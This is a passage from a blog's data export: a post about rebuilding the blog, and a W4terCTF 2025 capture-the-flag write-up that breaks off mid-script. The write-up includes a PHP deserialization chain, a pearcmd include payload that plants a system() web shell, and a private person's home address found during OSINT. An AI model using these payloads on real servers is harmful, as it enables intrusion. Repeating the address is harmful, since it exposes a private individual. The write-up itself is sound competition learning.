class=\"line\"></span><br><span class=\"line\">flag = <span class=\"built_in\">bytes</span>(decrypted).decode(<span class=\"string\">'utf-8'</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">\"Decrypted Flag:\"</span>, flag)</span><br></pre></td></tr></table></figure>\n<p>拿到flag</p>\n<p><img lazyload=\"\" src=\"/images/loading.svg\" data-src=\"8e4bbdacde59d80c8db2706f79dca28.png\" alt=\"alt text\"></p>\n","_processedHighlight":true},{"title":"A new journey","date":"2025-03-07T00:33:55.000Z","excerpt":"假装文艺。假装努力。","_content":"\n*指尖在键盘上狂舞*  \n*拉满了鼠标的弓*  \n*轻按缓弹，用二进制的命令创造和毁坏*  \n*溺死在代码的海洋里*  \n*又一次次获取新生*  \n*因知识而欢庆沉没*  \n*字符的跳跃，无声的赞歌*  \n*那些静躺的文字，也刮起了躁动的风*\n\n<p style=\"text-align:right;\"><i>——《P_0_mn_1》</i></p>\n\n\n# 再建博客的历程\n\n完整地搭过一遍博客，第二次就熟练很多✌️。\n\n不过还是遇到了很多问题。\n\n## 一些耗时的问题\n\n### 部署到服务器\n\n之前是用免费的额度部署在Zeabur上，不过现在要收费了，果断放弃。\n\n最后选择部署到了GitHub上：\n- GitHub支持静态网页托管\n- 可以绑定自定义域名\n- 其实是我没找到hexo部署到彩虹云的教程😅。。。\n\n教程网上一搜都有，也很详细。前面关联仓库之类的进行得还比较顺利，在绑定自己的域名的时候就出了一些差错，按某些教程添加一条CNAME记录总会失败，必须还要添加一条A记录才行。\n\n<img src=\"dns.jpg\" alt=\"alt text\" width=\"600\" height=\"100\">\n\n这样以后就能用 https://pomni.fun 访问了😁\n\n不过GitHub Pages的域名绑定有时候会自动清除，不懂是为什么了。\n\n🥴🥴🥴\n\n### 评论系统部署\n\n这里用的是[Twikoo](https://twikoo.js.org/quick-start.html)在 <code class=\"nextra-code\" dir=\"ltr\">**Vercel**</code> 上的部署。教程很详细，这里就不赘述了。\n\n\n因为Vercel默认的域名在境内访问速度很慢，绑定到自定义子域名就好了。\n👍👍👍\n\n## 碎碎念\n\n去年9月初开始搞，现在才搞好，我们拖延症是这样的🤷‍♀️\n\n之前搭建的东西变成了烂尾楼，索性跑路重新再搭了一个。\n\n域名几乎大半年没用，续费的话下一年比现在贵了二十几倍，可能到时候会换个新的吧。(我们穷鬼就是这样的🤷‍♀️)\n\n由于是部署在GitHub上，访问速度会慢很多。秉持着能少花一分钱是一分钱的原则，放弃买服务器😁\n\n总而言之，言而总之，这个博客不定时更新菜鸟的学习记录。\n欢迎各位大佬指正🙏🙏🙏\n\n","source":"_posts/A-new-journey.md","raw":"---\ntitle: A new journey\ndate: 2025-03-07 08:33:55\ntags: \nexcerpt: \"假装文艺。假装努力。\"\n---\n\n*指尖在键盘上狂舞*  \n*拉满了鼠标的弓*  \n*轻按缓弹，用二进制的命令创造和毁坏*  \n*溺死在代码的海洋里*  \n*又一次次获取新生*  \n*因知识而欢庆沉没*  \n*字符的跳跃，无声的赞歌*  \n*那些静躺的文字，也刮起了躁动的风*\n\n<p style=\"text-align:right;\"><i>——《P_0_mn_1》</i></p>\n\n\n# 再建博客的历程\n\n完整地搭过一遍博客，第二次就熟练很多✌️。\n\n不过还是遇到了很多问题。\n\n## 一些耗时的问题\n\n### 部署到服务器\n\n之前是用免费的额度部署在Zeabur上，不过现在要收费了，果断放弃。\n\n最后选择部署到了GitHub上：\n- GitHub支持静态网页托管\n- 可以绑定自定义域名\n- 其实是我没找到hexo部署到彩虹云的教程😅。。。\n\n教程网上一搜都有，也很详细。前面关联仓库之类的进行得还比较顺利，在绑定自己的域名的时候就出了一些差错，按某些教程添加一条CNAME记录总会失败，必须还要添加一条A记录才行。\n\n<img src=\"dns.jpg\" alt=\"alt text\" width=\"600\" height=\"100\">\n\n这样以后就能用 https://pomni.fun 访问了😁\n\n不过GitHub Pages的域名绑定有时候会自动清除，不懂是为什么了。\n\n🥴🥴🥴\n\n### 评论系统部署\n\n这里用的是[Twikoo](https://twikoo.js.org/quick-start.html)在 <code class=\"nextra-code\" dir=\"ltr\">**Vercel**</code> 上的部署。教程很详细，这里就不赘述了。\n\n\n因为Vercel默认的域名在境内访问速度很慢，绑定到自定义子域名就好了。\n👍👍👍\n\n## 碎碎念\n\n去年9月初开始搞，现在才搞好，我们拖延症是这样的🤷‍♀️\n\n之前搭建的东西变成了烂尾楼，索性跑路重新再搭了一个。\n\n域名几乎大半年没用，续费的话下一年比现在贵了二十几倍，可能到时候会换个新的吧。(我们穷鬼就是这样的🤷‍♀️)\n\n由于是部署在GitHub上，访问速度会慢很多。秉持着能少花一分钱是一分钱的原则，放弃买服务器😁\n\n总而言之，言而总之，这个博客不定时更新菜鸟的学习记录。\n欢迎各位大佬指正🙏🙏🙏\n\n","slug":"A-new-journey","published":1,"updated":"2025-04-04T16:53:59.235Z","comments":1,"layout":"post","photos":[],"_id":"cmamofqz300038otk7oohelm6","content":"<p><em>指尖在键盘上狂舞</em><br><em>拉满了鼠标的弓</em><br><em>轻按缓弹，用二进制的命令创造和毁坏</em><br><em>溺死在代码的海洋里</em><br><em>又一次次获取新生</em><br><em>因知识而欢庆沉没</em><br><em>字符的跳跃，无声的赞歌</em><br><em>那些静躺的文字，也刮起了躁动的风</em></p>\n<p style=\"text-align:right;\"><i>——《P_0_mn_1》</i></p>\n\n\n<h1 id=\"再建博客的历程\"><a href=\"#再建博客的历程\" class=\"headerlink\" title=\"再建博客的历程\"></a>再建博客的历程</h1><p>完整地搭过一遍博客，第二次就熟练很多✌️。</p>\n<p>不过还是遇到了很多问题。</p>\n<h2 id=\"一些耗时的问题\"><a href=\"#一些耗时的问题\" class=\"headerlink\" title=\"一些耗时的问题\"></a>一些耗时的问题</h2><h3 id=\"部署到服务器\"><a href=\"#部署到服务器\" class=\"headerlink\" title=\"部署到服务器\"></a>部署到服务器</h3><p>之前是用免费的额度部署在Zeabur上，不过现在要收费了，果断放弃。</p>\n<p>最后选择部署到了GitHub上：</p>\n<ul>\n<li>GitHub支持静态网页托管</li>\n<li>可以绑定自定义域名</li>\n<li>其实是我没找到hexo部署到彩虹云的教程😅。。。</li>\n</ul>\n<p>教程网上一搜都有，也很详细。前面关联仓库之类的进行得还比较顺利，在绑定自己的域名的时候就出了一些差错，按某些教程添加一条CNAME记录总会失败，必须还要添加一条A记录才行。</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"dns.jpg\"\n                      alt=\"alt text\" width=\"600\" height=\"100\"\n                ></p>\n<p>这样以后就能用 <a href=\"https://pomni.fun\">https://pomni.fun</a> 访问了😁</p>\n<p>不过GitHub Pages的域名绑定有时候会自动清除，不懂是为什么了。</p>\n<p>🥴🥴🥴</p>\n<h3 id=\"评论系统部署\"><a href=\"#评论系统部署\" class=\"headerlink\" title=\"评论系统部署\"></a>评论系统部署</h3><p>这里用的是<a class=\"link\"   href=\"https://twikoo.js.org/quick-start.html\" >Twikoo<i class=\"fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon\"></i></a>在 <code class=\"nextra-code\" dir=\"ltr\"><strong>Vercel</strong></code> 上的部署。教程很详细，这里就不赘述了。</p>\n<p>因为Vercel默认的域名在境内访问速度很慢，绑定到自定义子域名就好了。<br>👍👍👍</p>\n<h2 id=\"碎碎念\"><a href=\"#碎碎念\" class=\"headerlink\" title=\"碎碎念\"></a>碎碎念</h2><p>去年9月初开始搞，现在才搞好，我们拖延症是这样的🤷‍♀️</p>\n<p>之前搭建的东西变成了烂尾楼，索性跑路重新再搭了一个。</p>\n<p>域名几乎大半年没用，续费的话下一年比现在贵了二十几倍，可能到时候会换个新的吧。(我们穷鬼就是这样的🤷‍♀️)</p>\n<p>由于是部署在GitHub上，访问速度会慢很多。秉持着能少花一分钱是一分钱的原则，放弃买服务器😁</p>\n<p>总而言之，言而总之，这个博客不定时更新菜鸟的学习记录。<br>欢迎各位大佬指正🙏🙏🙏</p>\n","more":"<p><em>指尖在键盘上狂舞</em><br><em>拉满了鼠标的弓</em><br><em>轻按缓弹，用二进制的命令创造和毁坏</em><br><em>溺死在代码的海洋里</em><br><em>又一次次获取新生</em><br><em>因知识而欢庆沉没</em><br><em>字符的跳跃，无声的赞歌</em><br><em>那些静躺的文字，也刮起了躁动的风</em></p>\n<p style=\"text-align:right;\"><i>——《P_0_mn_1》</i></p>\n\n\n<h1 id=\"再建博客的历程\"><a href=\"#再建博客的历程\" class=\"headerlink\" title=\"再建博客的历程\"></a>再建博客的历程</h1><p>完整地搭过一遍博客，第二次就熟练很多✌️。</p>\n<p>不过还是遇到了很多问题。</p>\n<h2 id=\"一些耗时的问题\"><a href=\"#一些耗时的问题\" class=\"headerlink\" title=\"一些耗时的问题\"></a>一些耗时的问题</h2><h3 id=\"部署到服务器\"><a href=\"#部署到服务器\" class=\"headerlink\" title=\"部署到服务器\"></a>部署到服务器</h3><p>之前是用免费的额度部署在Zeabur上，不过现在要收费了，果断放弃。</p>\n<p>最后选择部署到了GitHub上：</p>\n<ul>\n<li>GitHub支持静态网页托管</li>\n<li>可以绑定自定义域名</li>\n<li>其实是我没找到hexo部署到彩虹云的教程😅。。。</li>\n</ul>\n<p>教程网上一搜都有，也很详细。前面关联仓库之类的进行得还比较顺利，在绑定自己的域名的时候就出了一些差错，按某些教程添加一条CNAME记录总会失败，必须还要添加一条A记录才行。</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"dns.jpg\"\n                      alt=\"alt text\" width=\"600\" height=\"100\"\n                ></p>\n<p>这样以后就能用 <a href=\"https://pomni.fun\">https://pomni.fun</a> 访问了😁</p>\n<p>不过GitHub Pages的域名绑定有时候会自动清除，不懂是为什么了。</p>\n<p>🥴🥴🥴</p>\n<h3 id=\"评论系统部署\"><a href=\"#评论系统部署\" class=\"headerlink\" title=\"评论系统部署\"></a>评论系统部署</h3><p>这里用的是<a class=\"link\"   href=\"https://twikoo.js.org/quick-start.html\" >Twikoo<i class=\"fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon\"></i></a>在 <code class=\"nextra-code\" dir=\"ltr\"><strong>Vercel</strong></code> 上的部署。教程很详细，这里就不赘述了。</p>\n<p>因为Vercel默认的域名在境内访问速度很慢，绑定到自定义子域名就好了。<br>👍👍👍</p>\n<h2 id=\"碎碎念\"><a href=\"#碎碎念\" class=\"headerlink\" title=\"碎碎念\"></a>碎碎念</h2><p>去年9月初开始搞，现在才搞好，我们拖延症是这样的🤷‍♀️</p>\n<p>之前搭建的东西变成了烂尾楼，索性跑路重新再搭了一个。</p>\n<p>域名几乎大半年没用，续费的话下一年比现在贵了二十几倍，可能到时候会换个新的吧。(我们穷鬼就是这样的🤷‍♀️)</p>\n<p>由于是部署在GitHub上，访问速度会慢很多。秉持着能少花一分钱是一分钱的原则，放弃买服务器😁</p>\n<p>总而言之，言而总之，这个博客不定时更新菜鸟的学习记录。<br>欢迎各位大佬指正🙏🙏🙏</p>\n","_processedHighlight":true},{"title":"W4terCTF 2025","date":"2025-05-13T11:33:14.000Z","excerpt":"拼尽全力。","_content":"\n\n\n# OSINT\n\n非常好玩的图寻题，但充分暴露出地理常识为0。幸运地抢了个三血。\n\n## 海的那边是\n\nPOV：**羡慕出题人在海边度假**\n\n\n\n\n![alt text](微信图片_20250503193131.jpg)\n\n\n因为对出题人在群里说正在San Diego的印象比较深，马上定位图片位置大概就是La Jolla。\n\n### task1\n\n保存图片后查看图片属性\n\n\n![alt text](image-20250503175742770.png)\nans：<u>**20250427**</u>\n\n\n\n### task3 \n\n\n![alt text](微信图片_20250503193419.png)\n\n先定位到建筑的位置会更方便做剩下几问，于是打开谷歌识图：\n发现了一模一样的建筑，连水管和猫头鹰装饰都一模一样！\n\n\n![alt text](微信图片_20250503193140.png)\n\n打开作者主页：\n\n![微信图片_20250503193150](微信图片_20250503193150.png)\n\n\n\n其他图片显示的内容也佐证了这一点，<u>在海边</u>。\n\n本来想在谷歌地图里面暴走一圈找到这个建筑来着，但是太暴力了点。\n\n又想去其他社交平台找这个作者，但是没什么发现。不过意外发现了这个作者的住址：***Jeremiah Regner, located at 9505 Gold Coast Dr Apt 98, San Diego, CA*.**\n\n![微信图片_20250503193205](微信图片_20250503193205.png)\n\n地点极其符合——在谷歌地图定位这个地址：\n\n![微信图片_20250503193217](微信图片_20250503193217.jpg)\n\n先在作者家附近的海岸找，果然找到了：\n\n![微信图片_20250503193223](微信图片_20250503193223.png)\n\n在地图上走啊走，就走到了：\n\n![微信图片_20250503194002](微信图片_20250503194002.png)\n\nans：<u>**Hubbs Hall**</u>\n\n\n\n### task2\n\n谷歌地图上是有充电头信息的，但是找不到，绷🤣\n\n不过好在有很多充电桩分布的网站提供信息。\n\n![微信图片_20250503194142](微信图片_20250503194142.png)\n\nans：<u>**J1772**</u>\n\n\n\n### task4\n\nez，随便找个出发点，最后都要坐30路公交。\n\n![微信图片_20250503194610](微信图片_20250503194610.png)\n\nans：<u>**30**</u>\n\n\n\n### task5\n\nHubbs Hall旁边的潮汐监测点在 Sccripps Pier，其站点编号是9410230。\n\n找到相关数据网站就有了。\n\n![微信图片_20250503195311](微信图片_20250503195311.png)\n\n图中数据即是5月7号的海浪预测峰值\n\np.s.：因为这里死活填不对，拷打了下出题人，出题人说可以ft转cm可以先舍去小数部分再计算，4ft算出来四舍五入是122，但是正确答案是121🥲。（原来保留整数就真的只是保留整数（部分）。。）\n\n以及不同网站的预测数据不太一样，有点搞......\n\nans：<u>**122 or 143**</u>\n\n### task6\n\n不学地理是这样的，☝️🤓可以算出海浪峰值周期40000多秒。\n\n找到现成的数据就好了：\n\n![微信图片_20250503200140](微信图片_20250503200140.png)\n\nans：<u>**10**</u>\n\n\n\n### flag\n\n![微信图片_20250503200530](微信图片_20250503200530.png)\n\n```\nFlag: W4terCTF{Sc1ENc3_UndOUBTEd1Y_IMMorT4I_5EA_Un4R9U481y_IlLumln4tlnG}\n```\n\n\n\n# WEB\n\n## Core Dump Error（签到题）\n\n半夜误打误撞做出来了。\n\n原来视频里面的issue只是被close而不是被delete了 hhh。\n\n只要找到相关issue的POC链然后改一下exec执行的命令就好了\n\n```json\n{\n    \"objects\": {\n      \"1\": {\n        \"type\": \"frame\",\n        \"attrs\": {\n          \"f_lineno\": \"11\",\n          \"f_locals\": \"12\",\n          \"f_code\": \"13\",\n          \"f_globals\": \"14\",\n          \"f_back\": \"15\"\n        }\n      },\n      \"11\": {\n        \"type\": \"int\",\n        \"value\": 1\n      },\n      \"12\": {\n        \"type\": \"dict\",\n        \"value\": {}\n      },\n      \"13\": {\n        \"type\": \"code\",\n        \"attrs\": {\n          \"co_filename\": \"131\",\n          \"co_name\": \"132\"\n        }\n      },\n      \"14\": {\n        \"type\": \"dict\",\n        \"value\": {\n          \"141\": \"143\",\n          \"142\": \"144\"\n        }\n      },\n      \"15\": {\n        \"type\": \"NoneType\"\n      },\n      \"131\": {\n        \"type\": \"str\",\n        \"value\": \"filename\"\n      },\n      \"132\": {\n        \"type\": \"str\",\n        \"value\": \"name\"\n      },\n      \"141\": {\n        \"type\": \"str\",\n        \"value\": \"__name__\"\n      },\n      \"142\": {\n        \"type\": \"str\",\n        \"value\": \"__loader__\"\n      },\n      \"143\": {\n        \"type\": \"str\",\n        \"value\": \"print(open('/tmp/flag').read())\"\n      },\n      \"144\": {\n        \"type\": \"EvilLoader\",\n        \"attrs\": {\n          \"get_source\": \"1441\"\n        }\n      },\n      \"1441\": {\n        \"type\": \"builtin_function\",\n        \"value\": \"exec\"\n      }\n    },\n    \"threads\": {\n      \"0\": {\n        \"frame\": \"1\"\n      }\n    },\n    \"current_thread\": \"0\",\n    \"files\": {},\n    \"metadata\": {\n      \"version\": \"0.4.0\"\n    }\n  }\n\n```\n\n![微信图片_20250505110938](微信图片_20250505110938.png)\n\n```\nFlag: W4terCTF{c0N9ra7u1ATIonS_0N_hacK1nG_A_pRoGraM_foR_TH3_1IrSt_t1Me}\n```\n\n\n\n## Happy PHP\n\n### part1\n\n阅读php代码，梳理逻辑如下：\n\n- 如果url中传递了参数  gogogo ，该对象就会被反序列化。\n- 反序列化的对象会触发魔术方法__wakeup()，并返回gogogo的结果。\n- 如果触发phpis 类的__invoke()方法，则执行fun1(fun2())，并通过eval()函数执行代码。返回结果 == 'Yelia'的话，就调用 what->saying。\n\n- 要调用piece1->here()，必须让 $flag 的 MD5 值等于 md5(666)。\n\n- 如果两个不同的变量 $sy 和 $su 的 MD5 和 SHA1相等，就能echo fl491.txt。\n\n通过构造反序列化的POP链，获得payload\n\n```php\n<?php\nclass phpis {\n    public $what;\n    public $fun1;\n    public $fun2;\n    function __invoke() { \n        if (preg_match('/^[a-z0-9]+$/', $this->fun1) ){\n        if(preg_match('/^[a-z0-9]+$/', $this->fun2)) {\n                $flag = eval(\"return $this->fun1($this->fun2());\");\n                if(intval($flag) == 'Yelia'){\n                    $this->what->saying();\n                } else {\n                    die(\"nonono ,please try again !!\");\n                }            \n            }\n        }\n    }\n}\n\nclass thebest {\n    public $gogogo;\n}\n\nclass language {\n    public $v1;\n    public $piece1;\n}\n\nclass right {\n    public $sy;\n    public $su;\n}\n\n\n$right = new right();\n$right->sy = [1];\n$right->su = [2]; \n\n$lang = new language();\n$lang->v1 = \"flag=\" . md5(666);\n$lang->piece1 = $right;\n\n$phpis = new phpis();\n$phpis->what = $lang;\n$phpis->fun1 = \"strlen\"; \n$phpis->fun2 = \"strrev\";\n\n$best = new thebest();\n$best->gogogo = $phpis;\n\n$payload = serialize($best);\necho \"payload：\\n\\n\";\necho urlencode($payload) . \"\\n\";\n?>\n\n//payload: ?gogogo=O%3A7%3A%22thebest%22%3A1%3A%7Bs%3A6%3A%22gogogo%22%3BO%3A5%3A%22phpis%22%3A3%3A%7Bs%3A4%3A%22what%22%3BO%3A8%3A%22language%22%3A2%3A%7Bs%3A2%3A%22v1%22%3Bs%3A37%3A%22flag%3Dfae0b27c451c728867a567e8c1bb4e53%22%3Bs%3A6%3A%22piece1%22%3BO%3A5%3A%22right%22%3A2%3A%7Bs%3A2%3A%22sy%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A1%3B%7Ds%3A2%3A%22su%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A2%3B%7D%7D%7Ds%3A4%3A%22fun1%22%3Bs%3A6%3A%22strlen%22%3Bs%3A4%3A%22fun2%22%3Bs%3A6%3A%22strrev%22%3B%7D%7D    \n    \n```\n\n![微信图片_20250503204222](微信图片_20250503204222.png)\n\n```flag\nFlag_piece_1: W4terCTF{i5_pHp\n```\n\n### part2\n\n进到 /1nCLud3.php 目录下\n\n根据源码，需要构造参数file，同时又要绕过正则匹配。试了很多种绕过都不太行，虽然$_SERVER['QUERY_STRING']在匹配的时候不会进行url解码，但是同样include打开文件的时候也不会进行url解码，试图构造用url编码方式绕过正则匹配的方式就行不通。\n\n根据提示：register_argc_argv=On，找到博客[register_argc_argv与include to RCE的巧妙组合 - Longlone's Blog](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合/)\n\n和这道题的思路非常像，所以仿照博客中的解题思路，利用pearcmd执行rce：\n\n“当我们include一个可以被php解析的文件的时候,php代码会被自动执行,这样在registerargcargv开启的情况下我们就有可能通过包含pearcmd.php与操控$_SERVER['argv']来执行pear命令。”\n\n```payload\n?file=pearcmd&+config-create+/<?phpsystem($_GET['cmd']);?>+/tmp/evil.php\n```\n\n因为浏览器会将< ? > 转义，所以通过burpsuite抓包后再GET传参\n\n![微信图片_20250504135809](微信图片_20250504135809.png)\n\n\n\n这便拿到了cmd的控制权，随后查找剩下的flag\n\n通过include打开evil.php继续利用cmd\n\n```payload\n?file=/tmp/evil&cmd=ls /tmp\n```\n\n![微信图片_20250504140529](微信图片_20250504140529.png)\n\n\n\n再配合通配符绕过一下\n\n```payload\n?file=/tmp/evil&cmd=cat /tmp/f*lag2.txt\n```\n\n![微信图片_20250504140829](微信图片_20250504140829.png)\n\n```\nFlag_piece2: _The_SA1E57_IaN9Ua63_in_tH3_wOr1D?_3nJoyyy_1t!}\n```\n\n```\nFlag: W4terCTF{i5_pHp_The_SA1E57_IaN9Ua63_in_tH3_wOr1D?_3nJoyyy_1t!}\n```\n\n\n\n##  Front End\n\n密码的web题\n\n![微信图片_20250504155416](微信图片_20250504155416.png)\n\n\n\nbase64编码\n\n![微信图片_20250504155524](微信图片_20250504155524.png)\n\n![微信图片_20250504155559](微信图片_20250504155559.png)\n\n\n\n打开 /hint.html\n\n![微信图片_20250504155659](微信图片_20250504155659.png)\n\n\n\n看到注释——JavaScript 混淆表达式。在控制台运行一下，得到encode.php\n\n![微信图片_20250504155944](微信图片_20250504155944.png)\n\n\n\n来到密码的部分\n\n根据\n\n![微信图片_20250504160243](微信图片_20250504160243.png)\n\n这一部分的判断逻辑，如果变量 rand 等于0 就输出加密后的内容。\n\n根据 rand 的定义，传递参数 r = 1537101982\n\n得到了调用两次encrypt的加密结果：\n\n```\nEncrypted: 253430495677694834376a30334d7643476e42466b36457a5672714649736d326b626d4c33666f4b6e546c7a324c583857396331543079 \nEncrypted: 4f59355430674b38334631497243574c6b58394d46486d706d4249384b5a3230344d4c776d476a5431585a64774f5852747a507779\n```\n\n而在php语言中，mt_rand()生成随机数的方式一般是根据时间戳，如果固定了种子，调用mt_srand(seed)后，mt_rand()生成的随机数序列是不变的。可以得出第一次调用 mt_rand()得到的值等于r，即 1537101982。\n\n网上查阅资料可知，可从生成的随机数序列倒推种子。运行脚本后得到：\n\n![微信图片_20250504160818](微信图片_20250504160818.png)\n\n\n\n\n得出了几个满足条件的种子，正向地用这些种子生成随机数序列\n\n```php\n<?php\n\n$seeds = [997887998, 1741048634, 2753486577, 3026673652, 4268323880];\n\nforeach ($seeds as $seed) {\n    echo \"Seed: $seed\\n\";\n    mt_srand($seed);  \n    \n    $rand1 = mt_rand();  \n    $rand2 = mt_rand();  \n    $rand3 = mt_rand();  \n    echo \"rand1: $rand1, rand2: $rand2, rand3: $rand3\\n\";\n    $seed_enc = $rand2 + $rand3 * 1000000000;  //得到加密中需要使用的种子\n        \n    echo \"Seed Encrypted: $seed_enc\\n\";\n    }\n    echo \"\\n\";  \n?>\n\n//Seed Encrypted: 656981344086716842\n//Seed Encrypted: 139121407568507466\n//Seed Encrypted: 1604674039149147684\n//Seed Encrypted: 1782694585991376243\n//Seed Encrypted: 1520982203885732553\n```\n\n最后再根据原文的加密逻辑倒推flag：\n\n```php\n<?php\n\n$chars     = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@!\";\n$chars_map = array_flip(str_split($chars));\n\nfunction decrypt($encrypted_text, $seed, $chars, $chars_map) {\n\n    //$encrypted_text = urldecode($encrypted_text);//url解码\n\n    $ch  = $encrypted_text[0];\n    $nh  = strpos($chars, $ch);//首字符的位置确定rand()产生的随机数\n    echo \"nh: {$nh}\\n\";\n    \n    $encrypted_body = substr($encrypted_text, 1);//实际加密数据\n\t\n    //根据加密逻辑倒推\n    $mdKey_full = md5((string)$seed . $ch);\n    $start      = $nh % 8;\n    $length     = $start + 7;           \n    $mdKey      = substr($mdKey_full, $start, $length);\n\n    $k    = 0;\n    $tmp  = '';\n    $keyL = strlen($mdKey);\n    for ($i = 0; $i < strlen($encrypted_body); $i++) {\n        $c       = $encrypted_body[$i];\n        $k       = $k % $keyL;\n        $ci      = $chars_map[$c];\n        // j = (ci - nh - ord(mdKey[k])) mod 64\n        $j       = ($ci - $nh - ord($mdKey[$k]) + 64*2) % 64;\n        $tmp    .= $chars[$j];\n        $k++;\n    }\n\n    return $tmp;\n}\n\n$seed    = '1782694585991376243';//手动更换计算得到的seed，wp为正确的seed\n$cipher1 = \"OY5T0gK83F1IrCWLkX9MFHmpmBI8KZ204MLwmGjT1XZdwOXRtzPwy\";\n//这里我已经先将加密的内容从转为转为了字节，并恢复了一些字符即url解码。\n\n$encoded = decrypt($cipher1, $seed, $chars, $chars_map);\n$flag    = base64_decode($encoded);\n\necho \"[+] Decrypted flag: {$flag}\\n\";\n?>\n\n```\n\n可成功解密flag\n\n![image-20250504162719128](image-20250504162719128.png)\n\n```\nW4terCTF{A1b_fROn7EnD_kEep5_8rEwinG}\n```\n\n\n\n# REVERSE\n\n## 网站管理员的登录密码\n\n根据提示需要找到**成功登录**的密码\n\n打开.pcapng，定位POST请求下的login流量包。\n\n![微信图片_20250504163434](微信图片_20250504163434.png)\n\n\n\n状态显示登陆成功，接下来只需要破解这段密码即可。\n\n![image-20250504163921288](image-20250504163921288.png)\n\n\n\n找到了密码的加密方式，用一个密钥和一个初始向量，AES加密\n\n对应地写个解密脚本\n\n```python \nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import unpad\nimport base64\n\n# 加密密钥和初始向量\nkey = bytes.fromhex(\"4ede70b7e44ffcc7cd912685defd05b1\")\niv = bytes.fromhex(\"c63b909a63ecdbbe813181e3c4734d87\")\n\n# 加密后的密文（Base64 编码）\nencrypted_text = \"gBjV3cE/UXEm7fXGXbQ4O7bXJEwi0y68SGNjkhuV2RW43lkkKm+xNQzpJDlfgCFOoAvOd0Ff1bg3Je4zbAAEdWpe8DmRdf5wH2F9vhAuDpg=\"\n\n# 将 Base64 编码的密文解码为字节\nencrypted_bytes = base64.b64decode(encrypted_text)\n\n# 创建 AES 解密器\ncipher = AES.new(key, AES.MODE_CBC, iv)\n\n# 解密并去除填充\ntry:\n    decrypted_bytes = cipher.decrypt(encrypted_bytes)\n    decrypted_text = unpad(decrypted_bytes, AES.block_size).decode('utf-8')\n    print(\"解密后的文本:\", decrypted_text)\nexcept ValueError as e:\n    print(\"解密失败:\", e)\n```\n\n![image-20250504164403519](image-20250504164403519.png)\n\n```\nFlag: W4terCTF{Fr0N73Nd!_17'5_my_5ymM3trlC_3ncrYpt1On!!!!!}\n```\n\n\n\n## 和谐小APP\n\n参考了这篇博客：[鸿蒙逆向 - SHCTF - Android？Harmony！题解 - 吾爱破解 - 52pojie.cn](https://www.52pojie.cn/thread-1973595-1-1.html)\n\n先将.hap文件改为.zip后缀解压\n\n<img src=\"image-20250504164803915.png\" alt=\"image-20250504164803915\" style=\"zoom:50%;\" />\n\n\n找到.abc文件，用abc反编译工具打开。在 entryability 下定位到 W4terCTF：\n\n![image-20250504165220376](image-20250504165220376.png)\n\n这段反编译的结果大致是说，如果 trim == \"flag\"，trim2 ==\"W4terCTF{...}\"，就会触发彩蛋。而彩蛋是从“libentry.so”中导入的guessWhat函数在 输入是trim2，种子是20250428 的条件下生成的。\n\n```\norz = import { default as orz } from \"@normalized:Y&&&libentry.so&\";\nobj4.message = orz.guessWhat(trim2, 20250428);\n```\n\n那么就定位到 libentry.so 文件。用 IDA 打开，定位到guesswhat函数\n\n![image-20250504170855720](image-20250504170855720.png)\n\n找到了函数的实际入口地址，F5一下，反编译代码主要逻辑如下：\n\n```js\nnapi_get_value_string_utf8(a1, v18, s1, 128LL, v13);//字符串\nnapi_get_value_double(a1, *((_QWORD *)&v18 + 1), &v12);//数字\n                      \n//对传入的两个参数进行一些变换\nv4 = 5 * (int)v12;\n  v5 = 15 * (int)v12;\n  v6 = 20 * (int)v12;\n  v7 = 10 * (int)v12;\n  for ( i = 0LL; ; i += 20LL )\n  {\n    *(_DWORD *)((char *)s1 + i) ^= v3;\n    if ( i > 0x77 )\n      break;\n    *(_DWORD *)((char *)s1 + i + 5) ^= v4 + v3;\n    *(_DWORD *)((char *)s1 + i + 10) ^= v7 + v3;\n    *(_DWORD *)((char *)s1 + i + 15) ^= v5 + v3;\n    v3 += v6;\n  }\n\n//最后判断变换后的变量是否与target相等\nif (!bcmp(s1, &target, 0x80))\n    v8 = &unk_910;  // 成功提示\nelse\n    v8 = &unk_91C;  // 失败提示\n```\n\n所以下面就是要去找到 target\n\n![image-20250504172003259](image-20250504172003259.png)\n\n提取出target的所有字节，并基于上面的变换逻辑恢复出flag即可\n\n```python\nimport struct\n\ntarget_bytes = bytes([\n    0x57, 0x34, 0x74, 0x65, 0x72, 0x6F, 0xA8, 0x4E, 0x7D, 0x57,\n    0x10, 0xBD, 0x5F, 0x53, 0x79, 0xCB, 0xA1, 0x68, 0x4D, 0x44,\n    0xE2, 0x95, 0x62, 0x55, 0x53, 0x83, 0xAF, 0x63, 0x53, 0x45,\n    0x57, 0xA8, 0x7C, 0x4D, 0x76, 0x71, 0xBA, 0x67, 0x45, 0x55,\n    0x47, 0x93, 0x74, 0x6F, 0x55, 0xE2, 0xE8, 0x04, 0x06, 0x70,\n    0xC8, 0xED, 0x6F, 0x0D, 0x45, 0x99, 0xD5, 0x62, 0x42, 0x00,\n    0x10, 0xD2, 0x6B, 0x48, 0x00, 0x3C, 0xCE, 0x74, 0x4E, 0x00,\n    0x68, 0xCA, 0x7D, 0x54, 0x00, 0x94, 0xC6, 0x86, 0x5A, 0x00,\n    0xC0, 0xC2, 0x8F, 0x60, 0x00, 0xEC, 0xBE, 0x98, 0x66, 0x00,\n    0x18, 0xBB, 0xA1, 0x6C, 0x00, 0x44, 0xB7, 0xAA, 0x72, 0x00,\n    0x70, 0xB3, 0xB3, 0x78, 0x00, 0x9C, 0xAF, 0xBC, 0x7E, 0x00,\n    0xC8, 0xAB, 0xC5, 0x84, 0x00, 0xF4, 0xA7, 0xCE, 0x8A, 0x00,\n    0x20, 0xA4, 0xD7, 0x90, 0x00, 0x00, 0x00, 0x00\n])\n\nv11 = 20250428  #传入的数值参数\nv2 = 0\nv3 = 5 * v11\nv4 = 15 * v11\nv5 = 20 * v11\nv6 = 10 * v11\n\ns1 = bytearray(target_bytes)\n\nfor i in range(0, 0x80, 20):\n    if i + 15 + 4 > len(s1): 